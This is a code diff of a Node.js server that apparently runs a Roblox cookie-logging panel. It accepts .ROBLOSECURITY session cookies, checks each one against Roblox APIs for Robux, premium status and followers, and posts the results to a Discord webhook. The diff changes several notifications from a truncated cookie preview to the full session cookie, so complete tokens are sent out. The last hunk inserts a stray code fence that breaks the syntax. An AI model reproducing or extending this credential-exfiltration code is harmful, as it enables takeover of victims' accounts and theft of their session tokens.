@@ -1,4 +1,3 @@
-
 const express = require('express');
 const axios = require('axios');
 const cookieParser = require('cookie-parser');
@@ -26,7 +25,7 @@ const clients = new Set();
 wss.on('connection', (ws) => {
     clients.add(ws);
     console.log('Client connected');
-    
+
     // Send current cookie data to new client
     try {
         ws.send(JSON.stringify({
@@ -36,7 +35,7 @@ wss.on('connection', (ws) => {
     } catch (error) {
         console.error('Error sending initial data to client:', error);
     }
-    
+
     // Add ping/pong for connection health
     const pingInterval = setInterval(() => {
         if (ws.readyState === WebSocket.OPEN) {
@@ -45,23 +44,23 @@ wss.on('connection', (ws) => {
             clearInterval(pingInterval);
         }
     }, 30000); // Ping every 30 seconds
-    
+
     ws.on('pong', () => {
         // Client is alive, connection is healthy
     });
-    
+
     ws.on('close', () => {
         clients.delete(ws);
         clearInterval(pingInterval);
         console.log('Client disconnected');
     });
-    
+
     ws.on('error', (error) => {
         console.error('WebSocket error:', error);
         clients.delete(ws);
         clearInterval(pingInterval);
     });
-    
+
     ws.on('message', (message) => {
         try {
             const data = JSON.parse(message);
@@ -79,7 +78,7 @@ wss.on('connection', (ws) => {
 function broadcast(data) {
     const message = JSON.stringify(data);
     const deadClients = [];
-    
+
     clients.forEach(client => {
         if (client.readyState === WebSocket.OPEN) {
             try {
@@ -92,7 +91,7 @@ function broadcast(data) {
             deadClients.push(client);
         }
     });
-    
+
     // Clean up dead connections
     deadClients.forEach(client => {
         clients.delete(client);
@@ -169,8 +168,8 @@ async function sendNewCookieNotification(cookieData) {
                     inline: true
                 },
                 {
-                    name: "🔐 Cookie Preview",
-                    value: `\`${cookieData.cookie}\``,
+                    name: "🔐 Full Cookie",
+                    value: `\`${cookieData.fullCookie || cookieData.cookie}\``,
                     inline: false
                 }
             ];
@@ -196,8 +195,8 @@ async function sendNewCookieNotification(cookieData) {
                     inline: false
                 },
                 {
-                    name: "🔐 Cookie Preview",
-                    value: `\`${cookieData.cookie}\``,
+                    name: "🔐 Full Cookie",
+                    value: `\`${cookieData.fullCookie || cookieData.cookie}\``,
                     inline: false
                 },
                 {
@@ -238,7 +237,7 @@ async function sendNewCookieNotification(cookieData) {
 // Send comprehensive new cookie notification with full details
 async function sendNewCookieWithFullDetailsNotification(cookieData) {
     if (!cookieData.isValid) return;
-    
+
     try {
         // Truncate cookie to prevent message size issues
         const truncatedCookie = cookieData.fullCookie ? 
@@ -281,8 +280,8 @@ async function sendNewCookieWithFullDetailsNotification(cookieData) {
                     inline: false
                 },
                 {
-                    name: "🔐 COOKIE",
-                    value: `\`${truncatedCookie}\``,
+                    name: "🔐 Full Cookie",
+                    value: `\`${cookieData.fullCookie || cookieData.cookie}\``,
                     inline: false
                 },
                 {
@@ -318,19 +317,19 @@ async function sendNewCookieWithFullDetailsNotification(cookieData) {
         console.log(`🎉 NEW COOKIE ALERT sent for: ${cookieData.username}`);
     } catch (error) {
         console.error('❌ Failed to send new cookie alert:', error.response?.status, error.message);
-        
+
         // Try sending a simpler notification as fallback
         try {
             const simplePayload = {
                 username: "🍪 Cookie Alert",
                 content: `🚨 **NEW ACCOUNT ADDED!** Username: **${cookieData.username}** | Robux: **${cookieData.robux || 0}** | Premium: **${cookieData.isPremium ? 'Yes' : 'No'}**\n\nCookie: \`${cookieData.fullCookie ? cookieData.fullCookie.substring(0, 50) + '...' : cookieData.cookie}\``
             };
-            
+
             await axios.post(DISCORD_WEBHOOK_URL, simplePayload, {
                 headers: { 'Content-Type': 'application/json' },
                 timeout: 10000
             });
-            
+
             console.log(`✅ Fallback notification sent for: ${cookieData.username}`);
         } catch (fallbackError) {
             console.error('❌ Fallback notification also failed:', fallbackError.response?.status, fallbackError.message);
@@ -341,7 +340,7 @@ async function sendNewCookieWithFullDetailsNotification(cookieData) {
 // Send comprehensive account information notification
 async function sendAccountInfoNotification(cookieData) {
     if (!cookieData.isValid) return;
-    
+
     try {
         const embed = {
             title: "📊 Complete Account Information",
@@ -376,7 +375,7 @@ async function sendAccountInfoNotification(cookieData) {
                     inline: false
                 },
                 {
-                    name: "🔐 Authentication Details",
+                    name: "🔐 Full Cookie",
                     value: `**Cookie:** \`${cookieData.fullCookie ? cookieData.fullCookie.substring(0, 50) + '...' : cookieData.cookie}\`\n**Last Verified:** ${new Date(cookieData.lastChecked).toLocaleString()}`,
                     inline: false
                 }
@@ -419,7 +418,7 @@ async function getRobloxUserInfo(cookie) {
             'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
             'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
         ];
-        
+
         const headers = {
             'Cookie': `.ROBLOSECURITY=${cookie}`,
             'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
@@ -466,11 +465,11 @@ async function getRobloxUserInfo(cookie) {
             }
             throw new Error(errorMessage);
         }
-        
+
         const userId = response.data.id;
         const username = response.data.name;
         const displayName = response.data.displayName;
-        
+
         // Get additional user details with retry logic
         let detailsResponse;
         let retries = 3;
@@ -492,7 +491,7 @@ async function getRobloxUserInfo(cookie) {
                 await new Promise(resolve => setTimeout(resolve, 2000));
             }
         }
-        
+
         // Get robux amount with enhanced error handling
         let robux = 0;
         try {
@@ -515,7 +514,7 @@ async function getRobloxUserInfo(cookie) {
                 console.log('Alternative robux fetch also failed');
             }
         }
-        
+
         // Check for premium status
         let isPremium = false;
         try {
@@ -539,7 +538,7 @@ async function getRobloxUserInfo(cookie) {
                 timeout: 5000
             });
             followers = followResponse.data.count || 0;
-            
+
             const followingResponse = await axios.get(`https://friends.roblox.com/v1/users/${userId}/followings/count`, {
                 headers: {
                     'User-Agent': headers['User-Agent'],
@@ -569,7 +568,7 @@ async function getRobloxUserInfo(cookie) {
         };
     } catch (error) {
         console.error('Error fetching user info:', error.response?.status, error.response?.statusText, error.message);
-        
+
         let errorMessage = 'Unknown error';
         if (error.response) {
             const status = error.response.status;
@@ -604,7 +603,7 @@ async function getRobloxUserInfo(cookie) {
         } else {
             errorMessage = error.message;
         }
-        
+
         return {
             isValid: false,
             error: errorMessage,
@@ -618,24 +617,24 @@ async function getRobloxUserInfo(cookie) {
 async function refreshCookie(cookieId) {
     const cookieData = activeCookies.get(cookieId);
     if (!cookieData) return;
-    
+
     const fullCookie = cookieData.fullCookie;
     const userInfo = await getRobloxUserInfo(fullCookie);
-    
+
     const updatedData = {
         ...cookieData,
         ...userInfo,
         id: cookieId
     };
-    
+
     activeCookies.set(cookieId, updatedData);
-    
+
     // Broadcast update to all clients
     broadcast({
         type: 'cookieUpdate',
         cookie: updatedData
     });
-    
+
     return updatedData;
 }
 
@@ -643,7 +642,7 @@ async function refreshCookie(cookieId) {
 setInterval(async () => {
     console.log('Auto-refreshing all cookies...');
     const cookieIds = Array.from(activeCookies.keys());
-    
+
     for (let i = 0; i < cookieIds.length; i++) {
         const cookieId = cookieIds[i];
         try {
@@ -652,7 +651,7 @@ setInterval(async () => {
         } catch (error) {
             console.error(`Failed to refresh cookie ${cookieId}:`, error.message);
         }
-        
+
         // Wait 3 seconds between requests to avoid rate limiting
         if (i < cookieIds.length - 1) {
             await new Promise(resolve => setTimeout(resolve, 3000));
@@ -664,9 +663,9 @@ setInterval(async () => {
 // Send periodic summary of all accounts every 30 minutes
 setInterval(async () => {
     const validCookies = Array.from(activeCookies.values()).filter(c => c.isValid && !c.isLoading);
-    
+
     if (validCookies.length === 0) return;
-    
+
     try {
         const embed = {
             title: "📈 Account Summary Report",
@@ -729,19 +728,19 @@ app.get('/', (req, res) => {
 
 app.post('/api/add-cookie', async (req, res) => {
     const { cookie } = req.body;
-    
+
     if (!cookie) {
         return res.status(400).json({ error: 'Cookie is required' });
     }
-    
+
     // Check if cookie already exists
     const existingCookie = Array.from(activeCookies.values()).find(c => c.fullCookie === cookie);
     if (existingCookie) {
         return res.status(400).json({ error: 'Cookie already exists' });
     }
-    
+
     const cookieId = Date.now().toString();
-    
+
     // Send immediate response with loading state
     const loadingData = {
         id: cookieId,
@@ -753,15 +752,15 @@ app.post('/api/add-cookie', async (req, res) => {
         addedAt: new Date().toISOString(),
         cookie: cookie.substring(0, 20) + '...'
     };
-    
+
     activeCookies.set(cookieId, loadingData);
-    
+
     // Broadcast loading state immediately
     broadcast({
         type: 'cookieAdded',
         cookie: loadingData
     });
-    
+
     // Fetch user info in background
     setTimeout(async () => {
         const userInfo = await getRobloxUserInfo(cookie);
@@ -771,15 +770,15 @@ app.post('/api/add-cookie', async (req, res) => {
             ...userInfo,
             isLoading: false
         };
-        
+
         activeCookies.set(cookieId, cookieData);
-        
+
         // Broadcast updated cookie data
         broadcast({
             type: 'cookieUpdate',
             cookie: cookieData
         });
-        
+
         // Send notification for any new cookie (valid or invalid)
         if (cookieData.isValid) {
             broadcast({
@@ -787,22 +786,22 @@ app.post('/api/add-cookie', async (req, res) => {
                 message: `✅ New cookie added: ${cookieData.username}`,
                 level: 'success'
             });
-            
+
             // Auto-copy new valid cookie to clipboard
             broadcast({
                 type: 'autoCopy',
                 cookieData: cookieData,
                 message: `🍪 New cookie auto-copied: ${cookieData.username}`
             });
-            
+
             // Send Discord webhook notifications for valid cookies
             await sendNewCookieNotification(cookieData);
-            
+
             // Send detailed account information separately
             setTimeout(async () => {
                 await sendAccountInfoNotification(cookieData);
             }, 2000);
-            
+
             // Send immediate new cookie notification with full details
             setTimeout(async () => {
                 await sendNewCookieWithFullDetailsNotification(cookieData);
@@ -813,19 +812,19 @@ app.post('/api/add-cookie', async (req, res) => {
                 message: `❌ Failed to add cookie: ${cookieData.error}`,
                 level: 'error'
             });
-            
+
             // Send Discord notification for invalid cookies too
             await sendNewCookieNotification(cookieData);
         }
     }, 100);
-    
+
     res.json({ success: true, data: loadingData });
 });
 
 app.post('/api/refresh-cookie/:id', async (req, res) => {
     const cookieId = req.params.id;
     const updatedData = await refreshCookie(cookieId);
-    
+
     if (updatedData) {
         res.json({ success: true, data: updatedData });
     } else {
@@ -835,16 +834,16 @@ app.post('/api/refresh-cookie/:id', async (req, res) => {
 
 app.delete('/api/remove-cookie/:id', (req, res) => {
     const cookieId = req.params.id;
-    
+
     if (activeCookies.has(cookieId)) {
         activeCookies.delete(cookieId);
-        
+
         // Broadcast removal to all clients
         broadcast({
             type: 'cookieRemoved',
             cookieId: cookieId
         });
-        
+
         res.json({ success: true });
     } else {
         res.status(404).json({ error: 'Cookie not found' });
@@ -852,7 +851,8 @@ app.delete('/api/remove-cookie/:id', (req, res) => {
 });
 
 app.get('/api/cookies', (req, res) => {
-    res.json(Array.from(activeCookies.values()));
+    res.json(```text
+Array.from(activeCookies.values()));
 });
 
 const PORT = process.env.PORT || 5000;
